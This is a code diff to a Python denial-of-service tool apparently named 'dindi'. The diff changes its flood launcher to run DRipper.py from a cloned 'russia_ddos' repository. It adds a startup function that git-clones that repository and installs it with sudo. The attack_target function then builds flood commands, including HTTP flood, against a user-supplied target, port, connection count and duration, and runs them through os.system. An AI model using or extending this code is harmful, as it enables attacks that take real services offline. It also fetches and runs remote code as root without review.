@@ -117,9 +117,13 @@ def attack_target(target, port, connections, duration, protocol):
     elif protocol == 'HTTPS':
         full_target = 'https://' + target + ' -m http-flood'
         
-    exe_command='sudo docker run -i --rm alexmon1989/dripper:latest -s ' + full_target + ' -t ' + str(connections) + ' -d ' + str(duration)
+    exe_command='sudo python3 ./russia_ddos/DRipper.py -s ' + full_target + ' -t ' + str(connections) + ' -d ' + str(duration)
     print('Start command:', exe_command)
     os.system(exe_command)
+
+def intialize_dripper():
+    os.system('git clone https://github.com/alexmon1989/russia_ddos.git')
+    os.system('cd russia_ddos && sudo python3 ./setup.py install')
 
 def main():
     print("Starting dindi...")
@@ -130,6 +134,8 @@ def main():
     parser.add_argument('-m', help='Specify protocol', default='TCP')
     parser.add_argument('-d', help='Duration in seconds', default=60)
     parser.add_argument('-a', help='Number attacks', default=1)
+
+    intialize_dripper()
 
     vpn_manager=VPNManager()
 
